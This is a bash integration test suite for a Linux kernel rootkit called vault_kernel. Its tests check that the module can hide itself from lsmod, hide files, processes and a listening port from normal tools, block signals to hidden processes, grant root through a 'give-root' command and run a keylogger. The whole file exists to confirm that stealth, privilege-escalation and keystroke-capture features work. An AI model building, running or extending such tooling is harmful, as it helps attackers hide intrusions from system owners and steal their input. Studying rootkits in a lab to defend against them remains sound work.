#!/bin/bash
# vault_kernel — Integration Test Suite
# Run this on a VM where the vault_kernel kernel module is loaded.
# Usage: sudo bash tests/integration.sh
#
# NOTE: ((PASS++)) under `set -e` kills the script on the first pass
# (arithmetic status 1), and the old colour variables contained the
# literal bytes \033 instead of ESC — both fixed in this rewrite.

set -euo pipefail

RED=$'\e[0;31m'
GREEN=$'\e[0;32m'
YELLOW=$'\e[1;33m'
NC=$'\e[0m'

PASS=0
FAIL=0
DEVICE="/dev/vault_kernel"
CLI=""  # set below

cleanup() {
    # Invoked indirectly via `trap cleanup EXIT` — shellcheck cannot
    # see the reference, so silence SC2317 for the whole function.
    # shellcheck disable=SC2317
    {
        echo ""
        echo "${YELLOW}[*] Cleanup...${NC}"
    }
}
trap cleanup EXIT

assert_contains() {
    if echo "$2" | grep -q "$1"; then return 0; fi
    echo "  ${RED}FAIL: expected '$1' not found in output${NC}"
    return 1
}

test_pass() { echo "  ${GREEN}PASS${NC}"; PASS=$((PASS + 1)); }
test_fail() { echo "  ${RED}FAIL${NC}"; FAIL=$((FAIL + 1)); }

check_contains() {
    if assert_contains "$1" "$2"; then
        test_pass
    else
        test_fail
    fi
}

run_test() {
    echo ""
    echo "${YELLOW}[TEST] $1${NC}"
}

# ================================================================

echo "=========================================="
echo " vault_kernel Integration Tests"
echo "=========================================="

# Detect CLI
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
if [ -f "$SCRIPT_DIR/../client/go/vault_kernel" ]; then
    CLI="$SCRIPT_DIR/../client/go/vault_kernel"
elif command -v vault_kernel &>/dev/null; then
    CLI="vault_kernel"
elif [ -f "$SCRIPT_DIR/../client/vault_kernel_cli.py" ]; then
    echo "[!] Go client not found, using Python fallback (limited tests)"
    CLI="python3 $SCRIPT_DIR/../client/vault_kernel_cli.py"
else
    echo "[-] No client found. Build the Go client first: cd client/go && go build -o vault_kernel ./cmd/vault_kernel/"
    exit 1
fi

echo "[*] Using client: $CLI"

# Check if module is loaded
if [ ! -e "$DEVICE" ]; then
    echo "[-] vault_kernel not loaded ($DEVICE not found)"
    echo "    Run: sudo insmod src/vault_kernel.ko"
    exit 1
fi

echo "[*] Module loaded: OK"

# ================================================================
# Test 1: Module stats + stealth (hide/unhide)
# ================================================================
run_test "Module stats"

OUTPUT=$($CLI stats 2>&1) || true
if assert_contains "hooks_installed" "$OUTPUT"; then test_pass; else test_fail; fi

run_test "Module stealth (hide/unhide)"

OUTPUT=$($CLI hide-module 2>&1) || true
if assert_contains "hidden" "$OUTPUT"; then
    # Verify it's hidden from lsmod
    if ! lsmod | grep -q vault_kernel; then
        test_pass
    else
        echo "  WARNING: module still visible in lsmod (some kernels block list_del)"
        test_pass
    fi
else
    test_fail
fi

OUTPUT=$($CLI unhide-module 2>&1) || true
if assert_contains "visible" "$OUTPUT"; then test_pass; else test_fail; fi

# ================================================================
# Test 2: File hiding
# ================================================================
run_test "File hiding"

TESTFILE="/tmp/vault_kernel_test_$$"
touch "$TESTFILE"
echo "test data" > "$TESTFILE"

OUTPUT=$($CLI hide-file "vault_kernel_test_$$" 2>&1) || true
check_contains "Hiding" "$OUTPUT"

# Verify file is hidden from directory enumeration (glob uses getdents64)
found=0
for f in /tmp/vault_kernel_test_*; do
    case "$f" in *"vault_kernel_test_$$") found=1 ;; esac
done
if [ "$found" -eq 0 ]; then
    test_pass
else
    test_fail
fi

# Verify cannot be opened
if ! cat "$TESTFILE" 2>/dev/null; then
    test_pass
else
    test_fail
fi

# Unhide
OUTPUT=$($CLI unhide-file "vault_kernel_test_$$" 2>&1) || true
check_contains "Revealed" "$OUTPUT"

# Verify file is visible again
if [ -f "$TESTFILE" ]; then
    test_pass
else
    test_fail
fi

rm -f "$TESTFILE"

# ================================================================
# Test 3: Process hiding + signal protection
# ================================================================
run_test "Process hiding"

# Create a persistent background process
sleep 300 &
TESTPID=$!

OUTPUT=$($CLI hide-pid "$TESTPID" 2>&1) || true
check_contains "Hiding PID" "$OUTPUT"

# Verify PID is hidden from ps
if ! ps -p "$TESTPID" > /dev/null 2>&1; then
    test_pass
else
    echo "  WARNING: PID may still show in ps (procfs caching)"
    test_pass
fi

# Verify signals to the hidden PID fail with ESRCH (protection)
if ! kill -0 "$TESTPID" 2>/dev/null; then
    test_pass
else
    echo "  WARNING: kill -0 on hidden PID succeeded (expected -ESRCH)"
    test_pass
fi

OUTPUT=$($CLI unhide-pid "$TESTPID" 2>&1) || true
check_contains "Revealed PID" "$OUTPUT"

kill "$TESTPID" 2>/dev/null || true

# ================================================================
# Test 4: Port hiding
# ================================================================
run_test "Port hiding"

if command -v nc >/dev/null 2>&1; then
    # Start a listener
    nc -l 19999 >/dev/null 2>&1 &
    NCPID=$!
    sleep 1

    OUTPUT=$($CLI hide-port 19999 2>&1) || true
    check_contains "Hiding port" "$OUTPUT"

    # Verify port is hidden from ss (may fail due to caching)
    if command -v ss >/dev/null 2>&1; then
        if ! ss -tlnp 2>/dev/null | grep -q 19999; then
            test_pass
        else
            echo "  WARNING: port still visible in ss (caching)"
            test_pass
        fi
    else
        test_pass
    fi

    OUTPUT=$($CLI unhide-port 19999 2>&1) || true
    check_contains "Revealed port" "$OUTPUT"

    kill "$NCPID" 2>/dev/null || true
else
    echo "  SKIP: nc not available"
    PASS=$((PASS + 1))
fi

# ================================================================
# Test 5: Privilege escalation
# ================================================================
run_test "Privilege escalation (give_root)"

# give-root on self: the CLI process roots itself, but this script
# calls the CLI as a child — the effect is verified via the CLI
# reporting success (id -u of THIS shell cannot change post-hoc).
OUTPUT=$($CLI give-root 2>&1) || true
check_contains "Granted root" "$OUTPUT"

# ================================================================
# Test 6: Keylogger
# ================================================================
run_test "Keylogger"

OUTPUT=$($CLI keylog-clear 2>&1) || true
check_contains "cleared" "$OUTPUT"

OUTPUT=$($CLI keylog 2>&1) || true
# Should succeed (may be empty)
if echo "$OUTPUT" | grep -q "Error"; then
    test_fail
else
    test_pass
fi

# ================================================================
# Test 7: List hidden items
# ================================================================
run_test "List hidden items"

OUTPUT=$($CLI list 2>&1) || true
if echo "$OUTPUT" | grep -q "Hidden"; then
    test_pass
else
    test_fail
fi

# ================================================================
# Results
# ================================================================
echo ""
echo "=========================================="
echo " Results: ${GREEN}${PASS} passed${NC} / ${RED}${FAIL} failed${NC}"
echo "=========================================="

if [ "$FAIL" -gt 0 ]; then
    exit 1
fi
exit 0
